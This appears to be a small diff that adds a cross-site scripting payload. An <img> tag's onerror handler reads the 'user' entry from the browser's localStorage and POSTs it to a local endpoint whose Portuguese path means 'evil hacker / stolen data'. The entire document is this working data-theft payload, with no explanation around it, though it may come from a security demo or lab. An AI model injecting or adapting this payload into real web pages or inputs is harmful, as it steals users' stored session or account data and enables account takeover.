@@ -1,0 +1,8 @@
+<img src=x onerror="
+  const dados = localStorage.getItem('user');
+  fetch('http://localhost:3001/hacker-malvadao/dados-roubados', {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({dados})
+  });
+">
